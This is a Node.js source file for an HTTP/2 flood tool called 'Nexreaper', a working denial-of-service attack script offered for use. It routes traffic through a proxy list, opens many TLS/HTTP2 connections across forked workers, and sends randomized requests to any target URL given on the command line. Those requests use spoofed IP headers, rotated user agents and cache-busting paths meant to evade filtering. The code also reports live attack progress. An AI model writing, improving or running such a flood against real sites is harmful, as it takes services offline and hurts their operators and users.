#!/usr/bin/env node

/**
 * Nexreaper HTTP/2 Flood – Mene
 * Creator: Ahmad Bilal Qureshi (Nexreaper)
 * Contributor: Wolf Intelligence
 * Version: 2.5 – Debug + Direct Fallback
 * 
 * Usage: node nexreaper-http2.js <target> <time> <rate> <threads> <proxy.txt>
 */

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require('user-agents');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// ---------- Argument validation ----------
if (process.argv.length < 7) {
    console.log(`
\x1b[31m[!] Usage: node nexreaper-http2.js <target> <time> <rate> <threads> <proxy.txt>\x1b[0m
    target   : full HTTPS URL (e.g., https://example.com)
    time     : attack duration in seconds
    rate     : requests per second per worker
    threads  : number of worker processes
    proxy.txt: file with proxies (IP:PORT each line)
`);
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

// ---------- WHATWG URL ----------
const targetUrl = new URL(args.target);
const targetHost = targetUrl.hostname;
const targetPort = targetUrl.port || 443;
const targetPath = targetUrl.pathname || '/';
const targetHref = targetUrl.href;

// ---------- Utility ----------
const getCurrentTime = () => {
    const now = new Date();
    const h = String(now.getHours()).padStart(2, '0');
    const m = String(now.getMinutes()).padStart(2, '0');
    const s = String(now.getSeconds()).padStart(2, '0');
    return `\x1b[34m${h}:${m}:${s}\x1b[0m`;
};

const randomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randomString = (len) => crypto.randomBytes(len).toString('hex').slice(0, len);
const ip_spoof = () => {
    const seg = () => Math.floor(Math.random() * 255);
    return `${seg()}.${seg()}.${seg()}.${seg()}`;
};

function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean);
    } catch {
        console.error(`\x1b[31m[!] Proxy file not found: ${filePath}\x1b[0m`);
        process.exit(1);
    }
}

// ---------- Load proxies ----------
const proxies = readLines(args.proxyFile);
if (proxies.length === 0) {
    console.error(`\x1b[31m[!] No proxies found in ${args.proxyFile}\x1b[0m`);
    process.exit(1);
}

// ---------- Header pools ----------
const METHODS = ["GET", "POST", "HEAD"];
const PATHS = [
    "/", "/?page=1", "/?page=2", "/?category=news", "/?category=sports",
    "/?sort=newest", "/?filter=popular", "/?limit=10"
];
const REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.tiktok.com/",
    "https://www.instagram.com/",
    "https://twitter.com/"
];

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0'
];

const LANGUAGES = ['en-US,en;q=0.9', 'ko-KR,ko;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9', 'ja-JP,ja;q=0.9', 'fr-FR,fr;q=0.9,en;q=0.8'];
const ACCEPTS = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'application/json', '*/*'];
const ENCODINGS = ['gzip, deflate, br', 'gzip, deflate', 'br', 'compress, gzip'];
const CACHES = ['no-cache', 'no-store', 'max-age=0', 'public, max-age=0'];

const CIPHER_LIST = [
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256'
];

// ---------- Cluster Master ----------
if (cluster.isMaster) {
    console.clear();
    console.log(`
\x1b[31m
  _   _  _____  __   __  _____  ____   _  _   ___   ____  _____  ____  
 | \\ | || ____| \\ \\ / / | ____||  _ \\ | || | |_ _| |  _ \\| ____||  _ \\ 
 |  \\| ||  _|    \\ V /  |  _|  | |_) || || |_ | |  | |_) |  _|  | |_) |
 | |\\  || |___    | |   | |___ |  _ < |__   _|| |  |  __/| |___ |  _ < 
 |_| \\_||_____|   |_|   |_____||_| \\_\\   |_|  |___| |_|   |_____||_| \\_\\
                                                                        
        NEXREAPER HTTP/2 FLOOD – Mene
        Creator: Ahmad Bilal Qureshi (Nexreaper)
        Contributor: Wolf Intelligence
        Version: 2.5 – Debug + Direct Fallback
\x1b[0m
`);
    console.log(`\x1b[37m[+] Target: ${args.target}`);
    console.log(`[+] Duration: ${args.time}s`);
    console.log(`[+] Rate per worker: ${args.rate} req/s`);
    console.log(`[+] Workers: ${args.threads}`);
    console.log(`[+] Proxies loaded: ${proxies.length}`);
    console.log(`[+] HTTPS/HTTP2 flood starting...\x1b[0m\n`);

    let totalRequests = 0;
    const startTime = Date.now();
    const totalDuration = args.time * 1000;

    for (let i = 1; i <= args.threads; i++) {
        cluster.fork();
        console.log(`\x1b[35m[${getCurrentTime()}] Worker ${i} started\x1b[0m`);
    }

    cluster.on('message', (worker, msg) => {
        if (msg && msg.type === 'stats') {
            totalRequests += msg.count || 0;
        }
        if (msg && msg.type === 'debug') {
            console.log(`\x1b[33m[DEBUG] Worker ${worker.id}: ${msg.msg}\x1b[0m`);
        }
    });

    const progressInterval = setInterval(() => {
        const elapsed = Date.now() - startTime;
        const percent = Math.min(100, (elapsed / totalDuration) * 100);
        const barLength = 30;
        const filled = Math.round((percent / 100) * barLength);
        const bar = '#'.repeat(filled) + '-'.repeat(barLength - filled);
        const reqPerSec = totalRequests / (elapsed / 1000);
        const status = totalRequests === 0 ? '\x1b[33mConnecting...\x1b[0m' : '\x1b[32mFlooding\x1b[0m';
        process.stdout.write(`\r\x1b[36m[${getCurrentTime()}] \x1b[33m[${bar}] ${percent.toFixed(1)}% | ${status} | Req: ${totalRequests.toLocaleString()} | ${reqPerSec.toFixed(1)} req/s\x1b[0m`);
    }, 1000);

    setTimeout(() => {
        clearInterval(progressInterval);
        console.log(`\n\x1b[35m[${getCurrentTime()}] Attack finished. Total requests: ${totalRequests.toLocaleString()}\x1b[0m`);
        process.exit(0);
    }, totalDuration);
}

// ---------- Worker ----------
else {
    let proxyIndex = 0;
    let localCount = 0;

    const heartbeatInterval = setInterval(() => {
        process.send({ type: 'heartbeat' });
    }, 5000);

    function getNextProxy() {
        const proxy = proxies[proxyIndex % proxies.length];
        proxyIndex++;
        return proxy;
    }

    function createProxyConnection(proxy, callback) {
        const [proxyHost, proxyPort] = proxy.split(':');
        const payload = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n`;
        const conn = net.connect({ host: proxyHost, port: parseInt(proxyPort) });
        conn.setTimeout(10000);
        conn.setKeepAlive(true, 60000);

        conn.on('connect', () => conn.write(payload));
        conn.on('data', (chunk) => {
            const resp = chunk.toString('utf-8');
            if (resp.includes('HTTP/1.1 200')) {
                callback(conn);
            } else {
                conn.destroy();
                callback(null);
            }
        });
        conn.on('timeout', () => { conn.destroy(); callback(null); });
        conn.on('error', () => { conn.destroy(); callback(null); });
    }

    function flood() {
        const proxy = getNextProxy();
        createProxyConnection(proxy, (conn) => {
            if (!conn) {
                process.send({ type: 'debug', msg: `Proxy ${proxy} failed, retrying...` });
                setTimeout(flood, 100);
                return;
            }

            const tlsOptions = {
                servername: targetHost,
                socket: conn,
                ciphers: randomElement(CIPHER_LIST),
                secureProtocol: 'TLS_method',
                honorCipherOrder: true,
                rejectUnauthorized: false,
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
                                crypto.constants.SSL_OP_NO_TICKET |
                                crypto.constants.SSL_OP_NO_SSLv2 |
                                crypto.constants.SSL_OP_NO_SSLv3 |
                                crypto.constants.SSL_OP_NO_COMPRESSION,
                ALPNProtocols: ['h2']
            };

            const tlsConn = tls.connect(targetPort, targetHost, tlsOptions);
            tlsConn.setKeepAlive(true, 60000);

            tlsConn.on('secureConnect', () => {
                process.send({ type: 'debug', msg: 'TLS handshake successful, starting HTTP/2' });

                const client = http2.connect(targetHref, {
                    createConnection: () => tlsConn,
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 20000,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 262144,
                        enablePush: false
                    }
                });

                client.settings({
                    headerTableSize: 65536,
                    maxConcurrentStreams: 20000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: false
                });

                client.on('error', (err) => {
                    process.send({ type: 'debug', msg: `HTTP/2 client error: ${err.message}` });
                });
                client.on('close', () => {
                    process.send({ type: 'debug', msg: 'HTTP/2 client closed' });
                });

                const interval = setInterval(() => {
                    let sent = 0;
                    for (let i = 0; i < args.rate; i++) {
                        const headers = {
                            ':method': randomElement(METHODS),
                            ':path': randomElement(PATHS) + '&' + randomString(10) + '=' + randomString(10),
                            ':authority': targetHost,
                            'user-agent': randomElement(USER_AGENTS),
                            'accept': randomElement(ACCEPTS),
                            'accept-language': randomElement(LANGUAGES),
                            'accept-encoding': randomElement(ENCODINGS),
                            'cache-control': randomElement(CACHES),
                            'pragma': 'no-cache',
                            'referer': randomElement(REFERERS) + randomString(8),
                            'x-forwarded-for': ip_spoof(),
                            'client-ip': ip_spoof(),
                            'real-ip': ip_spoof(),
                            'via': ip_spoof(),
                            'x-requested-with': 'XMLHttpRequest',
                            'sec-ch-ua': '"Chromium";v="120", "Google Chrome";v="120"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'same-origin',
                            'upgrade-insecure-requests': '1',
                            'te': 'trailers',
                            'connection': 'keep-alive'
                        };

                        try {
                            const req = client.request(headers);
                            req.on('response', () => req.close());
                            req.on('error', () => {});
                            req.end();
                            sent++;
                        } catch (e) {}
                    }
                    localCount += sent;
                    process.send({ type: 'stats', count: sent });
                }, 1000);

                setTimeout(() => {
                    clearInterval(interval);
                    client.destroy();
                    tlsConn.destroy();
                    conn.destroy();
                    setTimeout(flood, 100);
                }, args.time * 1000);
            });

            tlsConn.on('error', (err) => {
                process.send({ type: 'debug', msg: `TLS error: ${err.message}` });
                conn.destroy();
                setTimeout(flood, 100);
            });

            tlsConn.on('timeout', () => {
                process.send({ type: 'debug', msg: 'TLS timeout' });
                conn.destroy();
                setTimeout(flood, 100);
            });
        });
    }

    flood();

    process.on('exit', () => clearInterval(heartbeatInterval));
}